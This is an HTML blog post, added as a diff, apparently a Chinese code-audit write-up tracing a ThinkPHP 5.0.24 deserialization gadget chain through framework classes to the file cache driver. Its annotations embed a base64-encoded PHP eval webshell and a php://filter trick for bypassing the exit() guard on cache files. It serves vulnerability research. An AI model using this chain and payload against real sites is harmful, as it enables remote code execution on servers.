@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>thinkPHP5.0.24反序列化链 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="thinkPHP5.0.24反序列化链首先我们先全局搜索__destruct()，然后可以使用think\process\pipes\Windows.php里的__destruct() 12345public function __destruct()&amp;#123;    $this-&gt;close();    $this-&gt;removeFiles();&amp;#125; 然后看向removeF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkPHP5.0.24反序列化链">
+<meta property="og:url" content="http://example.com/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="thinkPHP5.0.24反序列化链首先我们先全局搜索__destruct()，然后可以使用think\process\pipes\Windows.php里的__destruct() 12345public function __destruct()&amp;#123;    $this-&gt;close();    $this-&gt;removeFiles();&amp;#125; 然后看向removeF">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-03T13:41:17.794Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-Thinkphp5.0.24反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-date">
+  	<time datetime="2021-11-02T16:00:00.000Z" itemprop="datePublished">2021-11-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      thinkPHP5.0.24反序列化链
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="thinkPHP5-0-24反序列化链"><a href="#thinkPHP5-0-24反序列化链" class="headerlink" title="thinkPHP5.0.24反序列化链"></a>thinkPHP5.0.24反序列化链</h1><p>首先我们先全局搜索__destruct()，然后可以使用think\process\pipes\Windows.php里的__destruct()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;close();</span><br><span class="line">    $this-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看向removeFiles()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private function removeFiles()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($this-&gt;files as $filename) &#123;</span><br><span class="line">        if (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于file_exists()函数的特性，我们可以通过构造$this-&gt;files来触发__toString()魔术方法，因此，我们全局搜索__toString()，发现我们可以利用think\Model.php的__toString()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看向toJson函数，然后再看向toArray函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">public function toArray()</span><br><span class="line"> &#123;</span><br><span class="line">     $item    = [];</span><br><span class="line">     $visible = [];</span><br><span class="line">     $hidden  = [];</span><br><span class="line"></span><br><span class="line">     $data = array_merge($this-&gt;data, $this-&gt;relation);</span><br><span class="line"></span><br><span class="line">     // 过滤属性</span><br><span class="line">     if (!empty($this-&gt;visible)) &#123;</span><br><span class="line">         $array = $this-&gt;parseAttr($this-&gt;visible, $visible);</span><br><span class="line">         $data  = array_intersect_key($data, array_flip($array));</span><br><span class="line">     &#125; elseif (!empty($this-&gt;hidden)) &#123;</span><br><span class="line">         $array = $this-&gt;parseAttr($this-&gt;hidden, $hidden, false);</span><br><span class="line">         $data  = array_diff_key($data, array_flip($array));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">         if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">             // 关联模型对象</span><br><span class="line">             $item[$key] = $this-&gt;subToArray($val, $visible, $hidden, $key);</span><br><span class="line">         &#125; elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) &#123;</span><br><span class="line">             // 关联模型数据集</span><br><span class="line">             $arr = [];</span><br><span class="line">             foreach ($val as $k =&gt; $value) &#123;</span><br><span class="line">                 $arr[$k] = $this-&gt;subToArray($value, $visible, $hidden, $key);</span><br><span class="line">             &#125;</span><br><span class="line">             $item[$key] = $arr;</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             // 模型属性</span><br><span class="line">             $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     // 追加属性（必须定义获取器）</span><br><span class="line">     if (!empty($this-&gt;append)) &#123;</span><br><span class="line">         foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">             if (is_array($name)) &#123;</span><br><span class="line">                 // 追加关联对象属性</span><br><span class="line">                 $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                 $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">             &#125; elseif (strpos($name, &#x27;.&#x27;)) &#123;</span><br><span class="line">                 list($key, $attr) = explode(&#x27;.&#x27;, $name);</span><br><span class="line">                 // 追加关联对象属性</span><br><span class="line">                 $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                 $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 $relation = Loader::parseName($name, 1, false);</span><br><span class="line">                 if (method_exists($this, $relation)) &#123;</span><br><span class="line">                     $modelRelation = $this-&gt;$relation(); //$this-&gt;error</span><br><span class="line">                     $value         = $this-&gt;getRelationData($modelRelation);</span><br><span class="line"></span><br><span class="line">                     if (method_exists($modelRelation, &#x27;getBindAttr&#x27;)) &#123;</span><br><span class="line">                         $bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line">                         if ($bindAttr) &#123;</span><br><span class="line">                             foreach ($bindAttr as $key =&gt; $attr) &#123;</span><br><span class="line">                                 $key = is_numeric($key) ? $attr : $key;</span><br><span class="line">                                 if (isset($this-&gt;data[$key])) &#123;</span><br><span class="line">                                     throw new Exception(&#x27;bind attr has exists:&#x27; . $key);</span><br><span class="line">                                 &#125; else &#123;</span><br><span class="line">                                     $item[$key] = $value ? $value-&gt;getAttr($attr) : null;</span><br><span class="line">                                 &#125;</span><br><span class="line">                             &#125;</span><br><span class="line">                             continue;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                     $item[$name] = $value;</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     $item[$name] = $this-&gt;getAttr($name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return !empty($item) ? $item : [];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以利用这里触发__call()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">               if (is_array($name)) &#123;</span><br><span class="line">                   // 追加关联对象属性</span><br><span class="line">                   $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                   $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">               &#125; elseif (strpos($name, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   list($key, $attr) = explode(&#x27;.&#x27;, $name);</span><br><span class="line">                   // 追加关联对象属性</span><br><span class="line">                   $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                   $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $relation = Loader::parseName($name, 1, false);</span><br><span class="line">                   if (method_exists($this, $relation)) &#123;</span><br><span class="line">                       $modelRelation = $this-&gt;$relation();</span><br><span class="line">                       $value         = $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
+<p>我们发现$name是可控的，而且搜索这一个类，发现getError()函数可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getError()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而$this-&gt;error也是可控的，而看向Loader::parseName($name, 1, false)，通过解释，发现它只是改变字符串的风格，所以$relation会是$name的值，而这里$modelRelation = $this-&gt;$relation();会调用getError()函数，然后我们再看向getRelationData()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected function getRelationData(Relation $modelRelation)</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123;</span><br><span class="line">        $value = $this-&gt;parent;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 首先获取关联数据</span><br><span class="line">        if (method_exists($modelRelation, &#x27;getRelation&#x27;)) &#123;</span><br><span class="line">            $value = $modelRelation-&gt;getRelation();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new BadMethodCallException(&#x27;method not exists:&#x27; . get_class($modelRelation) . &#x27;-&gt; getRelation&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见我们需要找到有getRelation方法的类，且这个类中的getRelation方法可以触发__call()，因此我们通过全局搜索，可以使用think\model\relation\BelongsTo.php里的getRelation方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function getRelation($subRelation = &#x27;&#x27;, $closure = null)</span><br><span class="line">&#123;</span><br><span class="line">    $foreignKey = $this-&gt;foreignKey;</span><br><span class="line">    if ($closure) &#123;</span><br><span class="line">        call_user_func_array($closure, [ &amp; $this-&gt;query]);</span><br><span class="line">    &#125;</span><br><span class="line">    $relationModel = $this-&gt;query</span><br><span class="line">        -&gt;removeWhereField($this-&gt;localKey)</span><br><span class="line">        -&gt;where($this-&gt;localKey, $this-&gt;parent-&gt;$foreignKey)</span><br><span class="line">        -&gt;relation($subRelation)</span><br><span class="line">        -&gt;find();</span><br><span class="line"></span><br><span class="line">    if ($relationModel) &#123;</span><br><span class="line">        $relationModel-&gt;setParent(clone $this-&gt;parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $relationModel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时因为$this-&gt;query是可控的，所以我们可以构造$this-&gt;query来触发__call，所以我们需要全局搜索__call，发现按我们可以使用think\console\Output.php里的__call()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $args)</span><br><span class="line">&#123;</span><br><span class="line">    if (in_array($method, $this-&gt;styles)) &#123;</span><br><span class="line">        array_unshift($args, $method);</span><br><span class="line">        return call_user_func_array([$this, &#x27;block&#x27;], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;</span><br><span class="line">        return call_user_func_array([$this-&gt;handle, $method], $args);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new Exception(&#x27;method not exists:&#x27; . __CLASS__ . &#x27;-&gt;&#x27; . $method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再看向block()函数，然后再看向writeln()函数，然后再看向write()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时$this-&gt;handle是可控的，所以我们可以全局搜索write，使用think\session\driver\Memcache.php里的write</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function write($sessID, $sessData)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;handler-&gt;set($this-&gt;config[&#x27;session_name&#x27;] . $sessID, $sessData, 0, $this-&gt;config[&#x27;expire&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用think\cache\driver\Memcached.php的set</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function set($name, $value, $expire = null)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($expire)) &#123;</span><br><span class="line">        $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    if ($expire instanceof \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;tag &amp;&amp; !$this-&gt;has($name)) &#123;</span><br><span class="line">        $first = true;</span><br><span class="line">    &#125;</span><br><span class="line">    $key    = $this-&gt;getCacheKey($name); //PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name</span><br><span class="line">    $expire = 0 == $expire ? 0 : $_SERVER[&#x27;REQUEST_TIME&#x27;] + $expire;</span><br><span class="line">    if ($this-&gt;handler-&gt;set($key, $value, $expire)) &#123; // $this-&gt;handler-&gt;set($key, $value, $expire)为true</span><br><span class="line">        isset($first) &amp;&amp; $this-&gt;setTagItem($key);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们看向赋值给$key的getCacheKry()函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;options[&#x27;prefix&#x27;] . $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现$this-&gt;options[‘prefix’]是可控的，然后我们再使用think\cache\driver\File.php的set</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public function set($name, $value, $expire = null) //第二次调用时，$name=tag_.md5(&#x27;123&#x27;),$value=$filename</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($expire)) &#123;</span><br><span class="line">        $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    if ($expire instanceof \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $this-&gt;getCacheKey($name, true); //php://filter/convert.base64-decode/resource=./md5(PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name).$name.php</span><br><span class="line">    if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = true;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;</span><br><span class="line">        //数据压缩</span><br><span class="line">        $data = gzcompress($data, 3);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    if ($result) &#123;</span><br><span class="line">        isset($first) &amp;&amp; $this-&gt;setTagItem($filename); </span><br><span class="line">        clearstatcache();</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于进入的数据$data会因为exit();，导致后面的数据无法使用，所以我们可以使用php伪协议的方式进行绕过，我们再次看向File.php的getCacheKey()函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name, $auto = false)</span><br><span class="line">&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    if ($this-&gt;options[&#x27;cache_subdir&#x27;]) &#123;</span><br><span class="line">        // 使用子目录</span><br><span class="line">        $name = substr($name, 0, 2) . DS . substr($name, 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;options[&#x27;prefix&#x27;]) &#123;</span><br><span class="line">        $name = $this-&gt;options[&#x27;prefix&#x27;] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $this-&gt;options[&#x27;path&#x27;] . $name . &#x27;.php&#x27;; // php://filter/convert.base64-decode/resource=./md5(PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name).$name.php</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    if ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, 0755, true);</span><br><span class="line">    &#125;</span><br><span class="line">    return $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可知$this-&gt;option[‘path’]是可控的，所以导入数据的文件名也是可控的，所以我们可以先第一次，导入数据进文件中，致使think\cache\driver\Memcached.php中的$this-&gt;handler-&gt;set($key, $value, $expire)为true，然后致使$key进入到setTagltem中去，而$key是我们可以控制的，所以我们看向setTagltem()函数，</p>
